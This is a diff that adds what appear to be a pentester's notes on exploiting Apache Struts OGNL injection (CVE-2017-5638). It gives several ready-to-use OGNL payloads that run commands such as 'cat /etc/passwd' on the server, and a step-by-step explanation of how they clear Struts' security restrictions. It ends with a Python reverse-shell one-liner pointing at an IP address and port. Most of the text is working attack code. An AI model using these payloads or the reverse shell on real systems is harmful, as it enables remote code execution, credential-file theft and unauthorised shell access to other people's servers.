@@ -1,0 +1,82 @@
+payload 1(linux)
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /etc/passwd').getInputStream())).(#q)}
+
+paylaod 2(linux)
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /etc/os-release').getInputStream())).(#q)}
+
+
+CVE-2017-5638 
+payload3(crossplateform) (not working)
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#context['xwork.MethodAccessor.denyMethodExecution']=false).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())
+
+explanation 
+
+#_=’multipart/form-data’ – a random variable, needed because the multipart/form-data string is necessary in our payload to trigger the vulnerability
+
+#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS – create the dm variable with the value of DefaultMemberAccess (more permissive than SecurityMemberAccess)
+
+#_memberAccess?(#_memberAccess=#dm) – if the _memberAccess class exists, we replace it with the DefaultMemberAccess from dm variable
+
+#container=#context[‘com.opensymphony.xwork2.ActionContext.container’] – get the container from the context; necessary at a later time
+
+#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class) – and use it to get an instance of the OgnlUtil class (we cannot do it directly because it is blacklisted – the full list is at ./src/core/src/main/resources/struts-default.xml)
+
+#ognlUtil.getExcludedPackageNames().clear() – clear the excluded package names
+
+#ognlUtil.getExcludedClasses().clear() – clear the excluded classes
+
+#context.setMemberAccess(#dm) – set the DefaultMemberAccess to the current context
+
+#cmd=’/usr/bin/touch /tmp/pwned’ – define the command we want to execute
+
+#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’)) – save in a variable if the app runs on Windows (cross-platform exploit)
+
+#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{‘/bin/bash’,’-c’,#cmd}) – specify how to execute the commands based on the Operating System (cmd.exe or bash)
+
+#p=new java.lang.ProcessBuilder(#cmds) – use the ProcessBuilder class to run the command (argument)
+
+#p.redirectErrorStream(true) – it might be also useful to see the error output of the command
+
+#process=#p.start() – execute the command
+
+#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()) – get the output stream of the response to send data back to the user
+@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros) – get the output of the executed command
+
+#ros.flush() – flush to make sure we send all the data
+
+links:
+https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/
+https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf
+https://blog.detectify.com/2019/03/21/apache-struts-vulnerabilities/
+https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/
+https://www.rapid7.com/db/modules/exploit/multi/http/struts2_namespace_ognl
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.90.100.40",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
